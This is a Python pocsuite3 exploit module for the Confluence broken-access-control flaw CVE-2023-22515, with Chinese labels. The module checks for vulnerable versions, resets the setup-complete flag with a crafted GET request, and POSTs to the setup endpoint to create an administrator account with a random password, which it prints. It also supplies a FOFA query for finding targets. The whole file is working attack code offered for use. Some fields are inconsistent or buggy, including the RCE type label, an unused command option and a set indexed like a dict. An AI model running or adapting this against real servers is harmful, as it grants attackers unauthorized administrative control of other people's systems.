# -*- coding:utf-8 -*-

from pocsuite3.api import Output, POCBase, register_poc, requests, logger, OptString
from collections import OrderedDict
import random,string

class DemoPOC(POCBase):
    vulID = "CVE-2023-22515"
    version ='1'
    author = ["LMX"]
    vulDate = "2023"
    createDate = "2023-11-8"
    updateDate = "2022-11-8"
    references =[""]
    name ="Confluence未授权管理用户添加"
    appPowerLink = ''
    appName = 'Confluence'
    appVersion = ''
    vulType = 'RCE'
    fofa = 'app=ATLASSIAN-Confluence'
    desc = '''
    Confluence未授权管理用户添加
    '''
    samples = []
    install_requires = ['']

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description="攻击时自定义命令")
        return o

    def _verify(self):
        result ={}
        try:
            r1 = requests.get(url=self.url+"/login.action",verify=False)
            r2 = requests.get(url=self.url+"/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false",verify=False)
            if any(key in r1.text for key in ('8.0.0','8.0.1','8.0.2','8.0.3','8.0.4','8.1.0','8.1.1','8.1.2','8.1.3','8.1.4','8.2.0','8.2.1','8.2.2','8.2.3','8.3.0','8.3.1','8.3.2','8.4.0','8.4.1','8.4.2','8.5.0','8.5.1')) and 'success' in r2.text:
                result['VerifyInfo'] = {f"该版本存在漏洞，可使用attack参数尝试添加用户"}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        result ={}
        headers = {
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept': '*/*',
            'Accept-Language': 'en-US;q=0.9,en;q=0.8',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36',
            'Connection': 'close',
            'Cache-Control': 'max-age=0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Atlassian-Token': 'no-check'
            }
        random_username = ''.join(random.choices(string.ascii_lowercase, k=8))
        random_password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        data = "username=" + random_username + "&fullName=" + random_username + "&email=rot@rot.com" + "&password=" + random_password + "&confirm=" + random_password + "&setup-next-button=Next"
        #data1 = "username=brot&fullName=brot&email=brot@brot.com&password=brot&confirm=brot&setup-next-button=Next"

        try:
            r = requests.get(url=self.url+"/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false",verify=False)
            response = requests.post(url=self.url + "/setup/setupadministrator.action", headers=headers, data=data, verify=False)
            if "Setup Successful" in response.text or "设置成功" in response.text:
                result['Output'] = f"\n"+"用户名："+random_username+":\n"+"密码："+random_password
        except Exception as e:
            pass

        return self.parse_output(result)
register_poc(DemoPOC)
